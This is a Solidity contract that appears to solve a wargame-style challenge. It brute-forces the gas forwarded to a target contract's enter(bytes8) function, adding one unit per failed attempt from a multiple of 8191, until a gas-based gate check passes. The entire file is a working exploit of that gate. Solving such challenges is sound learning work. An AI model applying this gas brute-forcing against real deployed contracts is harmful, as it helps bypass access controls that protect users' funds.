// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Solution {
    address public owner;
    address public gatekeeperOne;

    modifier onlyOwner {
        require(msg.sender == owner, "Not owner");
        _;
    }

    constructor(address _gatekeeperOne) {
        owner = msg.sender;
        gatekeeperOne = _gatekeeperOne;
    }

    function makeEntrant(bytes8 _gateKey, uint multiplier) onlyOwner public returns (uint){
        bool success = false;
        uint forwardedGas = multiplier*8191;

        while (!success) {
            (success,) = gatekeeperOne.call{gas: forwardedGas}(
                abi.encodeWithSignature("enter(bytes8)", _gateKey)
            );
            forwardedGas++;
        }

        return forwardedGas-1;
    }
}